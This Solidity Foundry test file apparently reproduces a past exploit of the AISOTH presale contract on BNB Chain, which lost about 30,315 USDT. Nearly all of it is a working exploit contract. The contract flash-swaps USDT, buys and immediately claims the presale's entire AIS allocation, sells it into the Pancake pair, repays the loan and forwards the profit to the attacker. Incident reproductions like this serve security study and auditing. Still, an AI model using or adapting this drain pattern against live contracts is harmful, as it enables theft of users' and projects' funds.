// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 30,314.76 USDT
// Attacker : 0x627df72cc3fa38c475a414e65cdece09b2b177af
// Attack Contract : 0x2078b0d64ede277d65bdf0272f64aef2a954deab
// Vulnerable Contract : 0x796c5e8ca10010654dafaef096bd1f4a7ad87672
// Victim : 0x9efb2e8ba06eb5981034f6e01350af041983e763
// Attack Tx : https://bscscan.com/tx/0x11462984d7f5663db9cf95c07c6cd9ff91f5b2d6616268e8dd6a3013e190248c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x796c5e8ca10010654dafaef096bd1f4a7ad87672#code

// @Analysis
// Twitter Guy : https://x.com/audit_911/status/2063565495073415618
//
// The attacker flash-swapped USDT, bought the full claimable AIS balance from Presale, immediately claimed it,
// sold the AIS into the AIS/USDT Pancake pair, repaid the flash swap, and forwarded the remaining USDT profit.

address constant ATTACKER = 0x627DF72cC3FA38C475A414e65CdECE09b2b177AF;
address constant PRESALE = 0x796C5E8cA10010654DafAeF096bd1F4a7ad87672;
address constant AIS = 0x67b6b8B8867e501385C95b843A23f9Bfe34811dB;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant USDT_WBNB_PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
address payable constant PANCAKE_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);

interface IAISOTHPresale {
    function price() external view returns (uint256);
    function buy(
        uint256 amount
    ) external;
    function claim() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 102_408_283;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(PRESALE, "AISOTH Presale");
        vm.label(AIS, "AISOTH");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(USDT_WBNB_PAIR, "USDT/WBNB Pancake pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
    }

    function testExploit() public {
        AISOTHPresaleExploit exploit = new AISOTHPresaleExploit(ATTACKER);

        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 30_000 ether, "USDT profit");
    }
}

contract AISOTHPresaleExploit {
    address private immutable profitReceiver;

    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IERC20 private constant ais = IERC20(AIS);
    IAISOTHPresale private constant presale = IAISOTHPresale(PRESALE);
    IPancakePair private constant loanPair = IPancakePair(USDT_WBNB_PAIR);
    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        // step 1: borrow enough USDT to buy the full AIS inventory available in Presale.
        uint256 presaleAisBalance = ais.balanceOf(PRESALE);
        uint256 borrowAmount = (presaleAisBalance * presale.price()) / 1e18;
        loanPair.swap(borrowAmount, 0, address(this), bytes("1"));

        // step 6: after repaying the flash swap, forward the remaining USDT to the attacker EOA.
        uint256 profit = usdt.balanceOf(address(this));
        usdt.transfer(profitReceiver, profit);
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == USDT_WBNB_PAIR, "not loan pair");
        require(sender == address(this), "bad sender");
        require(amount0 > 0 && amount1 == 0 && data.length > 0, "bad loan");

        // step 2: buy Presale allocation with the flash-swapped USDT.
        usdt.approve(PRESALE, amount0);
        presale.buy(amount0);

        // step 3: immediately claim the AIS credited by buy().
        presale.claim();

        // step 4: sell claimed AIS through the fee-on-transfer supporting Pancake router path.
        uint256 aisBalance = ais.balanceOf(address(this));
        ais.approve(PANCAKE_ROUTER, aisBalance);
        address[] memory path = new address[](2);
        path[0] = AIS;
        path[1] = USDT_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            aisBalance, 1, path, address(this), block.timestamp
        );

        // step 5: repay the Pancake V2 flash swap with the 0.25% pair fee.
        uint256 repayment = (amount0 * 10_000) / 9975 + 1;
        usdt.transfer(USDT_WBNB_PAIR, repayment);
    }
}
